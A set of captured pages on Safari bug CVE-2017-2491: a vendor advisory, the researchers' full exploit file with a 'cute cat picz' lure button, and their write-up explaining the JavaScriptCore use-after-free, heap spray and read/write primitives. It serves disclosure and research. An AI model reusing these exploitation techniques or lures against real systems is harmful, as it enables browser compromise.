=== Content from www.zerodayinitiative.com_8decc66a_20250125_125412.html ===

[![thezdi](/images/logo.svg)](/)

Menu

* [PRIVACY](https://www.trendmicro.com/privacy)
* [WHO WE ARE](/about/)
* [HOW IT WORKS](/about/benefits/)
* [BLOG](/blog/)
* [ADVISORIES](/advisories/)
* [LOG IN](/portal/)
  [SIGN UP](/portal/register/)

Menu

* [PRIVACY](https://www.trendmicro.com/privacy/)
* [WHO WE ARE](/about/)
* [HOW IT WORKS](/about/benefits/)
* [BLOG](/blog/)
* [ADVISORIES](/advisories/)
* [LOG IN](/portal/)
* [SIGN UP](/portal/register/)

* [![thezdi](/images/logo.svg)](/)
* [Trend Micro](https://www.trendmicro.com/)

# Advisory Details

May 4th, 2017
## (Pwn2Own) Apple Safari String replace Use-After-Free Remote Code Execution Vulnerability

### ZDI-17-321ZDI-CAN-4578

| CVE ID | [CVE-2017-2491](https://www.cve.org/CVERecord?id=CVE-2017-2491) |
| --- | --- |
| CVSS SCORE | 6.8, [AV:N/AC:M/Au:N/C:P/I:P/A:P](http://nvd.nist.gov/cvss.cfm?calculator&version=2.0&vector=AV:N/AC:M/Au:N/C:P/I:P/A:P) |
| AFFECTED VENDORS | [Apple](http://www.apple.com) |
| AFFECTED PRODUCTS | [Safari](http://www.apple.com/safari/) |
| VULNERABILITY DETAILS | This vulnerability allows remote attackers to execute arbitrary code on vulnerable installations of Apple Safari. User interaction is required to exploit this vulnerability in that the target must visit a malicious page or open a malicious file.  The specific flaw exists within the handling of the String.replace method. The issue results from the lack of validating the existence of an object prior to performing operations on the object. An attacker can leverage this vulnerability to execute code under the context of the current process. |
| ADDITIONAL DETAILS | Apple has issued an update to correct this vulnerability. More details can be found at: |
| DISCLOSURE TIMELINE | * 2017-03-17 - Vulnerability reported to vendor * 2017-05-04 - Coordinated public release of advisory |
| CREDIT | Samuel Groß and Niklas Baumstark |

[BACK TO ADVISORIES](/advisories/)

### General Inquiries

zdi@trendmicro.com

### Find us on X

[@thezdi](https://twitter.com/thezdi)

### Find us on Mastodon

[Mastodon](https://infosec.exchange/%40thezdi)

### Media Inquiries

media\_relations@trendmicro.com

### Sensitive Email Communications

[PGP Key](https://www.zerodayinitiative.com/documents/zdi-pgp-key.asc)

[WHO WE ARE](/about/)

* [Our Mission](/about/)
* [Trend Micro](https://www.trendmicro.com)
* [TippingPoint IPS](https://www.trendmicro.com/en_us/business/products/network/integrated-atp/next-gen-intrusion-prevention-system.html)

[HOW IT WORKS](/about/benefits/)

* [Process](/about/benefits/#process)
* [Researcher Rewards](/about/benefits/#researcher-rewards)
* [FAQS](/about/faq/)
* [Privacy](https://www.trendmicro.com/privacy/)

[ADVISORIES](/advisories)

* [Published Advisories](/advisories/published)
* [Upcoming Advisories](/advisories/upcoming)
* [RSS Feeds](/rss)

[BLOG](/blog)

[![thezdi](/images/logo-footer.svg)](/)



=== Content from github.com_149b0bc8_20250126_084237.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fphoenhex%2Ffiles%2Fblob%2Fmaster%2Fexploits%2Fcachedcall-uaf.html)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fphoenhex%2Ffiles%2Fblob%2Fmaster%2Fexploits%2Fcachedcall-uaf.html)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=phoenhex%2Ffiles)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[phoenhex](/phoenhex)
/
**[files](/phoenhex/files)**
Public

* [Notifications](/login?return_to=%2Fphoenhex%2Ffiles) You must be signed in to change notification settings
* [Fork
  145](/login?return_to=%2Fphoenhex%2Ffiles)
* [Star
   524](/login?return_to=%2Fphoenhex%2Ffiles)

* [Code](/phoenhex/files)
* [Issues
  1](/phoenhex/files/issues)
* [Pull requests
  0](/phoenhex/files/pulls)
* [Actions](/phoenhex/files/actions)
* [Projects
  0](/phoenhex/files/projects)
* [Security](/phoenhex/files/security)
* [Insights](/phoenhex/files/pulse)

Additional navigation options

* [Code](/phoenhex/files)
* [Issues](/phoenhex/files/issues)
* [Pull requests](/phoenhex/files/pulls)
* [Actions](/phoenhex/files/actions)
* [Projects](/phoenhex/files/projects)
* [Security](/phoenhex/files/security)
* [Insights](/phoenhex/files/pulse)

## Files

 master
## Breadcrumbs

1. [files](/phoenhex/files/tree/master)
2. /[exploits](/phoenhex/files/tree/master/exploits)
/
# cachedcall-uaf.html

Copy path Blame  Blame
## Latest commit

## History

[History](/phoenhex/files/commits/master/exploits/cachedcall-uaf.html)182 lines (154 loc) · 6.08 KB master
## Breadcrumbs

1. [files](/phoenhex/files/tree/master)
2. /[exploits](/phoenhex/files/tree/master/exploits)
/
# cachedcall-uaf.html

Top
## File metadata and controls

* Code
* Blame

182 lines (154 loc) · 6.08 KB[Raw](https://github.com/phoenhex/files/raw/refs/heads/master/exploits/cachedcall-uaf.html)123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182<script>// Exploit for CVE-2017-2491, Safari 10.0.3// https://phoenhex.re/2017-05-04/pwn2own17-cachedcall-uaf
function make\_compiled\_function() { function target(x) { return x\*5 + x - x\*x; } // Call only once so that function gets compiled with low level interpreter // but none of the optimizing JITs target(0); return target;}
function pwn() { var haxs = new Array(0x100); for (var i = 0; i < 0x100; ++i) haxs[i] = new Uint8Array(0x100);
 // hax is surrounded by other Uint8Array instances. Thus \*(&hax - 8) == 0x100, // which is the butterfly length if hax is later used as a butterfly for a // fake JSArray. var hax = haxs[0x80]; var hax2 = haxs[0x81];
 var target\_func = make\_compiled\_function();
 // Small helper to avoid allocations with .set(), so we don't mess up the heap function set(p, i, a,b,c,d,e,f,g,h) { p[i+0]=a; p[i+1]=b; p[i+2]=c; p[i+3]=d; p[i+4]=e; p[i+5]=f; p[i+6]=g; p[i+7]=h; }
 function spray() { var res = new Uint8Array(0x7ffff000); for (var i = 0; i < 0x7ffff000; i += 0x1000) { // Write heap pattern. // We only need a structure pointer every 128 bytes, but also some of // structure fields need to be != 0 and I can't remember which, so we just // write pointers everywhere. for (var j = 0; j < 0x1000; j += 8) set(res, i + j, 0x08, 0, 0, 0x50, 0x01, 0, 0, 0);
 // Write the offset to the beginning of each page so we know later // with which part we overlap. var j = i+1+2\*8; set(res, j, j&0xff, (j>>8)&0xff, (j>>16)&0xff, (j>>24)&0xff, 0, 0, 0xff, 0xff); } return res; }
 // Spray ~14 GiB worth of array buffers with our pattern. var x = [ spray(), spray(), spray(), spray(), spray(), spray(), spray(), spray(), ];
 // The butterfly of our fake object will point to 0x200000001. This will always // be inside the second sprayed buffer. var buf = x[1];
 // A big array to hold reference to objects we don't want to be freed. var ary = new Array(0x10000000); var cnt = 0;
 // Set up objects we need to trigger the bug. var n = 0x40000; var m = 10; var regex = new RegExp("(ab)".repeat(n), "g"); var part = "ab".repeat(n); var s = (part + "|").repeat(m);
 // Set up some views to convert pointers to doubles var convert = new ArrayBuffer(0x20); var cu = new Uint8Array(convert); var cf = new Float64Array(convert);
 // Construct fake JSCell header set(cu, 0, 0,0,0,0, // structure ID 8, // indexing type 0,0,0); // some more stuff we don't care about
 var container = { // Inline object with indebufng type 8 and butterly pointing to hax. // Later we will refer to it as fakearray. jsCellHeader: cf[0], butterfly: hax, };
 while (1) { // Try to trigger bug s.replace(regex, function() { for (var i = 1; i < arguments.length-2; ++i) { if (typeof arguments[i] === 'string') { // Root all the callback arguments to force GC at some point ary[cnt++] = arguments[i]; continue; } var a = arguments[i];
 // a.butterfly points to 0x200000001, which is always // inside buf, but we are not sure what the exact // offset is within it so we read a marker value. var offset = a[2];
 // Compute addrof(container) + 16. We write to the fake array, then // read from a sprayed array buffer on the heap. a[2] = container; var addr = 0; for (var j = 7; j >= 0; --j) addr = addr\*0x100 + buf[offset + j];
 // Add 16 to get address of inline object addr += 16;
 // Do the inverse to get fakeobj(addr) for (var j = 0; j < 8; ++j) { buf[offset + j] = addr & 0xff; addr /= 0x100; } var fakearray = a[2];
 // Re-write the vector pointer of hax to point to hax2. fakearray[2] = hax2;
 // At this point hax.vector points to hax2, so we can write // the vector pointer of hax2 by writing to hax[16+{0..7}]
 // Leak address of JSFunction a[2] = target\_func; addr = 0; for (var j = 7; j >= 0; --j) addr = addr\*0x100 + buf[offset + j];
 // Follow a bunch of pointers to RWX location containing the // function's compiled code addr += 3\*8; for (var j = 0; j < 8; ++j) { hax[16+j] = addr & 0xff; addr /= 0x100; } addr = 0; for (var j = 7; j >= 0; --j) addr = addr\*0x100 + hax2[j];
 addr += 3\*8; for (var j = 0; j < 8; ++j) { hax[16+j] = addr & 0xff; addr /= 0x100; } addr = 0; for (var j = 7; j >= 0; --j) addr = addr\*0x100 + hax2[j];
 addr += 4\*8; for (var j = 0; j < 8; ++j) { hax[16+j] = addr & 0xff; addr /= 0x100; } addr = 0; for (var j = 7; j >= 0; --j) addr = addr\*0x100 + hax2[j];
 // Write shellcode for (var j = 0; j < 8; ++j) { hax[16+j] = addr & 0xff; addr /= 0x100; } hax2[0] = 0xcc; hax2[1] = 0xcc; hax2[2] = 0xcc;
 // Pwn. target\_func(); } return "x"; }); }}</script>
<button onclick="pwn()">click here for cute cat picz!</button>

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from phoenhex.re_389e0e0b_20250126_084236.html ===

[![](/imgs/header_small.jpg)](/)

* [Writeups](/)
* [Bugs](/bugs)
* [Team](/team)
* [Files](https://github.com/phoenhex/files)

# Pwn2Own 2017: UAF in JSC::CachedCall (WebKit)

May 4, 2017
â¢ By
[niklasb](https://twitter.com/_niklasb),
[saelo](https://twitter.com/5aelo)

As a quick introduction, we are [Samuel GroÃ](https://twitter.com/5aelo), AKA
saelo, and [Niklas Baumstark](https://twitter.com/_niklasb), both students at
Karlsruhe Institute of Technology, and have been playing CTF together for quite
some time before we decided to team up for this yearâs Pwn2Own. Today we are
writing about a use-after-free bug in Safari 10.0.3 that could be used to get remote code
execution in the browserâs renderer process. This article is part of a series
of write-ups we plan to do about the bugs and exploits we used to break Safari
and escalate to root privileges on an up-to-date MacBook Pro.

## A sad tale of two WebKit bugs

Our demo at Pwn2Own was a bit unusual in that we used a 1-day bug to get RCE
inside the Safari renderer. This was due to some unfortunate timing:
Around the beginning of February, saelo found a bug in the `CachedCall` class,
which seemed almost impossible to exploit when we first looked at it. We then
decided to try it anyways about two weeks later and ended up with a working
exploit. At that point saelo [tweeted the SHA-256 of a simple
PoC](https://twitter.com/5aelo/status/833047999026692096), which is the file
[poc-cachedcall-uaf.js](https://github.com/phoenhex/files/blob/master/pocs/poc-cachedcall-uaf.js). Only 7 hours
later (!) an Apple employee opened a [bug report about
this](https://bugs.webkit.org/show_bug.cgi?id=168567), crushing our hopes of
building a full 0-day exploit chain with this bug. We donât think the
developers recognized it as a security issue, since the bug is not hidden in
the tracker. Later we learned that an internal fuzzer had triggered the bug,
forcing them to push a fix.

With roughly one month left until the competition, we decided to concentrate on
new WebKit code that would be introduced in the upcoming Safari 10.1. We
succeeded in finding and exploiting a bug there, but again were a bit
unfortunate because Apple decided not to release Safari 10.1 (as part of macOS
10.12.4) before the contest. We reported this second bug too and will do
a write-up about it once it is fixed, since it affects the current Safari 10.1.

## Overview

The WebKit bug we used at Pwn2Own is
[CVE-2017-2491](https://support.apple.com/en-us/HT207600)
/ [ZDI-17-231](http://www.zerodayinitiative.com/advisories/ZDI-17-321/),
a use-after-free of a `JSString` object in JavaScriptCore. By
triggering it, we can obtain a dangling pointer to a `JSString` object in
a JavaScript callback. At first, the specific scenario seems very hard to
exploit, but we found a rather generic technique to still get a reliable
read/write primitive out of it, although it requires a very large (~28 GiB)
heap spray. This is possible even on a MacBook with 8 GB of RAM thanks to the
page compression mechanism in macOS.

The following article is structured as follows:

* [The Bug](#the-bug)
* [Exploitation](#exploitation)
* [Triggering the bug](#triggering-the-bug)
* [From fakeobj/addrof to arbitrary R/W](#from-fakeobjaddrof-to-arbitrary-rw)
* [Surviving a completely broken heap](#surviving-a-completely-broken-heap)

The full, commented exploit can be found in the file
[cachedcall-uaf.html](https://github.com/phoenhex/files/blob/master/exploits/cachedcall-uaf.html).

## The Bug

When
[`String.prototype.replace`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/replace)
is called with a `RegExp` object as the first argument, [the following native
function](https://github.com/WebKit/webkit/blob/498268047e19b5e310afe767cf21b061a79ea780/Source/JavaScriptCore/runtime/StringPrototype.cpp#L490) is invoked in
JavaScriptCore (JSC), the JavaScript engine of WebKit:

```
static ALWAYS_INLINE EncodedJSValue replaceUsingRegExpSearch(
    VM& vm, ExecState* exec, JSString* string, JSValue searchValue, CallData& callData,
    CallType callType, String& replacementString, JSValue replaceValue)
{
    // ...

    // [[ This path is taken if the regex has the g flag set and
    //    the second argument is a JS function ]]
    if (global && callType == CallType::JS) {
        // regExp->numSubpatterns() + 1 for pattern args, + 2 for match start and string
        int argCount = regExp->numSubpatterns() + 1 + 2;
        JSFunction* func = jsCast<JSFunction*>(replaceValue);
        CachedCall cachedCall(exec, func, argCount);        // [[ 0 ]]
        RETURN_IF_EXCEPTION(scope, encodedJSValue());
        if (source.is8Bit()) {
            while (true) {
                int* ovector;
                MatchResult result = regExpConstructor->performMatch(vm, regExp, string, source, startPosition, &ovector);
                if (!result)
                    break;

                if (UNLIKELY(!sourceRanges.tryConstructAndAppend(lastIndex, result.start - lastIndex)))
                    OUT_OF_MEMORY(exec, scope);

                unsigned i = 0;
                for (; i < regExp->numSubpatterns() + 1; ++i) {
                    int matchStart = ovector[i * 2];
                    int matchLen = ovector[i * 2 + 1] - matchStart;

                    if (matchStart < 0)
                        cachedCall.setArgument(i, jsUndefined());
                    else
                        // [[ 1 ]]
                        cachedCall.setArgument(i, jsSubstring(&vm, source, matchStart, matchLen));
                }

                cachedCall.setArgument(i++, jsNumber(result.start));
                cachedCall.setArgument(i++, string);

                cachedCall.setThis(jsUndefined());
                JSValue jsResult = cachedCall.call();           // [[ 2 ]]
                replacements.append(jsResult.toWTFString(exec));
                RETURN_IF_EXCEPTION(scope, encodedJSValue());

                lastIndex = result.end;
                startPosition = lastIndex;

                // special case of empty match
                if (result.empty()) {
                    startPosition++;
                    if (startPosition > sourceLen)
                        break;
                }
            }
        }

    // ...

```

At [[ 0 ]], a `CachedCall` instance is created, which is later used to call the
callback function.
In the branch of WebKit used for Safari 10.0.3, [the `CachedCall`
class looked as follows](https://github.com/WebKit/webkit/blob/498268047e19b5e310afe767cf21b061a79ea780/Source/JavaScriptCore/interpreter/CachedCall.h#L67):

```
class CachedCall {

    // ...

    private:
        bool m_valid;
        Interpreter* m_interpreter;
        VM& m_vm;
        VMEntryScope m_entryScope;
        ProtoCallFrame m_protoCallFrame;
        Vector<JSValue> m_arguments;
        CallFrameClosure m_closure;
};

```

As we can see, a `WTF::Vector` is used to hold the arguments, and during the algorithm
above, these are the only references to the objects created by `jsSubstring`.
In JavaScriptCore, all objects whose lifetime is managed by the garbage collector
inherit from `JSCell`. During the marking step of the [mark & sweep
algorithm](https://en.wikipedia.org/wiki/Tracing_garbage_collection#Basic_algorithm),
several locations are scanned for references to `JSCell`s and marked recursively.
These include:

* the current call stack
* the global JavaScript execution context, including the so-called *global
  object*
* special buffers such as `MarkedArgumentBuffer`
* probably some others

All objects that are not reachable by traversing pointers from any of those
locations are eligible to be freed during the sweeping step of the GC
algorithm. This means that if the only references to a `JSCell` lie in opaque
heap buffers such as a `WTF::Vector`, the garbage collector has no way of
finding and marking them correctly, and they will be swept and freed if a major
garbage collection cycle happens.

In the case of `String.prototype.replace`, a major GC can happen during the
allocation of a new argument string at [[ 1 ]]. In that case, the previous
arguments (`JSString` instances) will be collected and freed. When the call is
later performed at [[ 2 ]], the callback function will receive pointers to the
freed `JSCell`s as arguments. Note that the GC needs to happen *before* the
callback, otherwise there will be references to the substring objects on the
call stack.

The file [poc-cachedcall-uaf.js](https://github.com/phoenhex/files/blob/master/pocs/poc-cachedcall-uaf.js) demonstrates the
issue and works in Safari 10.0.3: At the end of the script, `i_am_free` is
a pointer to a freed `JSString`. Doing anything with it other than checking its
type will likely crash the browser, because its `JSCell` header has been
overwritten with a free-list pointer (more on that later). The relevant source
code is shown below:

```
function i_want_to_break_free() {
    var n = 0x40000;
    var m = 10;
    var regex = new RegExp("(ab)".repeat(n), "g"); // g flag to trigger the vulnerable path
    var part = "ab".repeat(n); // matches have to be at least size 2 to prevent interning
    var s = (part + "|").repeat(m);
    while (true) {
        var cnt = 0;
        var ary = [];
        s.replace(regex, function() {
            for (var i = 1; i < arguments.length-2; ++i) {
                if (typeof arguments[i] !== 'string') {
                    i_am_free = arguments[i];
                    throw "success";
                }
                ary[cnt++] = arguments[i];  // root everything to force GC
            }
            return "x";
        });
    }
}
try { i_want_to_break_free(); } catch (e) { }
console.log(typeof(i_am_free));  // will print "object"

```

The bug [was fixed by replacing `Vector` with
`MarkedArgumentBuffer` in the `CachedCall`
class](https://github.com/WebKit/webkit/commit/7d1b3b9542d9870b8524f284e108bea56397bd3a#diff-9548589d17126311e3c48799703a4617L73).

## Exploitation

Often, use-after-free bugs in browser can be exploited by turning them
into a type confusion when a new object gets allocated in the freed
spot. The situation is different in the context of JSC though: It operates on
`JSCell` objects which contain their own type information. Hence a dangling
pointer to a `JSCell` cannot be directly exploited if the freed spot is occupied
by a different, newly allocated `JSCell`. Exploitation might still be possible if
the freed object was keeping some other garbage collected object alive, or
if the dangling pointer can be made to point to the inside of another `JSCell`
via a misalignment. The former case is known from the famous [Pegasus
exploit](https://info.lookout.com/rs/051-ESQ-475/images/pegasus-exploits-technical-details.pdf),
where a freed (but still intact) `JSArray` was used after its backing buffer had
already been freed and replaced.

Both of these cases are not exhibited here: The `JSString` objects created by
`jsSubstring` share their content with the original `JSString` on which
`replace()` was called, and which continues to live. Furthermore, `JSString` objects
are allocated inside a heap block where only other `JSCell`s of roughly the same size
(24 or 32 bytes) are allocated, and all allocations will be aligned to 32
bytes.

Our only idea for applying common techniques here is to deallocate the whole
heap block containing the arena, and allocate an arena responsible for
different types in its place. We never investigated this further. Instead we
ended up using a different approach which is very generic and turned out to
work quite well for Pwn2Own.

### JSCell free-list pointer type confusion

When a `JSCell` is collected and swept, its first 8 bytes are replaced by
a pointer to the next free cell in the same heap block. The other fields
remain unchanged. For this reason, if we try to use the dangling
pointer without allocating something over the freed `JSString` object first,
we get a crash.

The first 8 bytes of a used `JSCell` contains the following fields:

```
StructureID m_structureID;           // dword
IndexingType m_indexingTypeAndMisc;  // byte
JSType m_type;                       // byte
TypeInfo::InlineTypeFlags m_flags;   // byte
CellState m_cellState;               // byte

```

At this point, the very weak heap address layout randomization of Safari comes
in handy: On macOS 10.12.3, heap addresses in Safari start at around
`0x110000000` to `0x120000000` and grow upward. If a pointer in this range
overlaps with a `JSCell` header, the lower 32 bits of the free-list pointer will overlap
with the structure ID and bits 32-39 will become the indexing type, while the
three other fields are zero.

We can construct a usable `JSObject` by spraying multiple gigabytes of memory
(using array buffers) such that the IndexingType becomes 8. We need to spray
around 7 times 4 GiB of memory because we need an address in the range
`0x800000000` to `0x8ffffffff`. Spraying this much memory is easily possible due
to [macOSâs page compression](https://arstechnica.com/apple/2013/10/os-x-10-9/17/),
but it takes about 50 seconds on the target machine used in Pwn2Own (a 2016 13.3â
MacBook Pro with 16GB of RAM).

Indexing type 8 corresponds to fast contiguous storage for `JSValue`s
(`ContiguousShape`). Indexed accesses on this object will directly consult the
butterfly of the object instead of performing a full property lookup. How
butterflies work is described in section 1.2 of [saeloâs phrack
paper](http://www.phrack.org/papers/attacking_javascript_engines.html). The
butterfly pointer is the second quadword of the `JSObject`, which happens to
overlap with the old string length and type flags (both 32-bit integers) of
the freed `JSString` instance. In our exploit those will always produce the
pointer `0x200000001`, which conveniently points inside our heap spray. The
following graphic illustrates the overlap between a `JSString` and
the `JSObject` which occurs after the `JSCell` header is overwritten by a heap
pointer of the form `0x8xxxxxxxx`:

```
Original JSString:

 JSCell fields                                              JSString fields
+---------------------------------------------------------------------------+
| dword        | byte         | byte   | byte  | byte      | dword | dword  |
| StructureID  | IndexingType | JSType | flags | CellState | flags | length |
|              |              |        |       |           |       |        |
| *            | *            | *      | *     | *         | 0x01  | 0x02   |
+---------------------------------------------------------------------------+

After header is overwritten by the pointer 0x8xxxxxxxx, we get a JSObject:

 JSCell fields                                              JSObject fields
+---------------------------------------------------------------------------+
| dword        | byte         | byte   | byte  | byte      | qword          |
| StructureID  | IndexingType | JSType | flags | CellState | butterfly ptr  |
|              |              |        |       |           |                |
| xxxxxxxx     | 0x08         | 0      | 0     | 0         | 0x200000001    |
+---------------------------------------------------------------------------+

```

At this point, we have access to a fake `JSObject` with fast-path indexing, whose
butterfly overlaps with an `ArrayBuffer` we control as part of our heap spray.
This can be easily turned into the *fakeobj* and *addrof* primitives as
described in section 4 of the phrack paper linked above, by writing to the fake
`JSObject` and reading from the corresponding `ArrayBuffer`, as well as the
other way around. From there we proceed as usual: We construct an arbitrary
read/write primitive, overwrite the JIT code of a JavaScript function with our
own shellcode, and call the function.

Some operations still access the structure of our fake `JSObject`, so we need
to have a valid structure ID. The structure is retrieved through a table lookup
using the structure ID as the index. The table contains pointers to `Structure`
instances. Since we cannot control the structure ID itself (it overlaps with
the free-list pointer), the lookup will access memory beyond the table and in
our sprayed region. We thus have to create fake structure table entries in our
heap spray. The free-list pointer will be 16 byte aligned, which is the
granularity of the JSC allocators. Moreover, when accessing the structure
instance through the structure table, the index is multiplied by 8 (pointer
size). As such we only need to have a structure pointer every 128 bytes in our
spray. In our exploit, we set all fake table entries to the fixed pointer
`0x150000008` and create a fake structure instance at the beginning of every
page in the sprayed data.

## Triggering the bug

The approach from above looks straightforward at first:

1. Spray 28 GiB of memory to push heap into `0x8xxxxxxxx` region.
2. Trigger the bug.

However, the second step is not actually that easy. While the simple PoC code
from above triggers almost immediately in Safari 10.0.3, this is only because
the heap is very small at that point in time, so GC happens very frequently.
With 28 GiB of mapped memory, it is very unlikely that an allocation still
triggers GC due to heuristics in the JSC allocator.

The good thing however is that at least in the version of JSC used for Safari
10.0.3, the garbage collector is completely deterministic, even though the new
concurrent garbage collector in WebKit HEAD no longer is. So we just played
around until we found a combination of heap spray, regex and input string
that reliably triggers the bug in the `0x8xxxxxxxx` region. In our actual exploit
we only spray 14 GiB of array buffers before we start to call
`String.prototype.replace` in a loop. It just so happens that this reliably
leads to the situation we need, where the indexing type of a freed `JSString`
ends up being overwritten with 8.

We had some ideas how to make it work even in WebKit HEAD, but then Apple fixed
the bug so we stopped working on it. This means however that our exploit is
very fragile with regard to the heap setup. If we change the allocation pattern
of the exploit too much, the bug no longer triggers at the correct time and the
exploit fails.

## From fakeobj/addrof to arbitrary R/W

[saeloâs phrack paper](http://www.phrack.org/papers/attacking_javascript_engines.html)
uses the following approach to go from being able to fake a JSC object to
arbitrary read/write:

1. Spray a lot of different `Float64Array` structures so that we can guess one
   of those structure IDs reliably.
2. Fake a Float64Array `fakearray` with the guessed structure ID inside the inline
   properties of a `JSObject`. Its data pointer points to a `Uint8Array` called
   `hax`.
3. For a read or write, set `fakearray[2] = <target address>` and then read/write
   from/to `hax`.

The setup looks as follows:

```
    fakearray                             hax
+----------------+                  +----------------+
|  Float64Array  |   +------------->|  Uint8Array    |
|                |   |              |                |
|  JSCell        |   |              |  JSCell        |
|  butterfly     |   |              |  butterfly     |
|  vector  ------+---+              |  vector        |
|  length        |                  |  length        |
|  mode          |                  |  mode          |
+----------------+                  +----------------+

```

We tried using the same approach at first for our Pwn2Own exploit, but step 1
messed up our heap layout too much. In the interest of KISS, we just used our
newly learned trick again:

1. Fake a `JSObject` called `fakearray` with indexing type 8 and
   structure ID 0 inside the inline properties of another object. Have its butterfly
   point to a `Uint8Array` called `hax`.
2. Create an extra `Uint8Array` called `hax2`.
3. Set `fakearray[2] = hax2`, thereby changing the backing buffer of `hax` to
   the address of `hax2`.
4. For a read/write, write the target address to `hax` at offset 16, thereby
   changing the backing buffer of `hax2` to the target. Then read/write to/from
   `hax2`.

This works because a structure with ID 0 always exists in Safari 10.0.3. The
setup here looks as follows:

```
      fakearray                        hax                       hax2
+--------------------+         +------------------+        +--------------+
|  JSObject          |   +---->|  Uint8Array      |  +---->|  Uint8Array  |
|                    |   |     |                  |  |     |              |
|  structureID = 0   |   |     |  JSCell          |  |     |  JSCell      |
|  indexingType = 8  |   |     |  butterfly       |  |     |  butterfly   |
|  <rest of JSCell>  |   |     |  vector       ------+     |  vector      |
|  butterfly       ------+     |  length = 0x100  |        |  length      |
|                    |         |  mode            |        |  mode        |
+--------------------+         +------------------+        +--------------+

```
## Surviving a completely broken heap

By allocating a `JSCell` over any of the freed `JSString`s, we effectively
corrupt the free list of the heap block where the `JSString` resided. This
completely breaks the allocator, so we need to make sure that we perform no
allocations of size 24 or 32 in our exploit. This is easier said than done:
While we can easily avoid manual allocations by not creating any objects,
calling JavaScript functions or executing a loop with more than 16
iterations internally triggers certain JIT compilation tasks that perform
allocations of the problematic sizes and crash JSC immediately.

It is possible to fix the broken free list and restore a somewhat
reasonable heap state to work with, but for the purpose of Pwn2Own we decided to go
with the route of just having a very ugly but reliable exploit code that
avoids any loops, function calls/definitions or any other dangerous operations.
Inside our second stage, we immediately register a signal handler for SIGSEGV,
SIGBUS and SIGALRM that causes the faulting thread to sleep infinitely. This
way any concurrently running threads cannot crash the process while our sandbox
escape is running.

The full, commented exploit can be found in the file
[cachedcall-uaf.html](https://github.com/phoenhex/files/blob/master/exploits/cachedcall-uaf.html).

show Disqus comments

[github](https://github.com/phoenhex)

![](/imgs/Twitter_logo_blue.png)
@
email



=== Content from www.trendmicro.com_7e785017_20250126_084234.html ===


[![](/content/dam/trendmicro/global/en/core/images/logos/tm-logo-red-new-navigation.svg)

Business](/en_ie/business.html)

search
close

* Solutions
  + [By Challenge](/en_ie/business/solutions/challenges.html)
    - [By Challenge](/en_ie/business/solutions/challenges.html)
      * By Challenge
        [Learn more](/en_ie/business/solutions/challenges.html)
    - [Understand, Prioritize & Mitigate Risks](/en_ie/business/solutions/challenges/cyber-risk.html)
      * Understand, Prioritize & Mitigate Risks

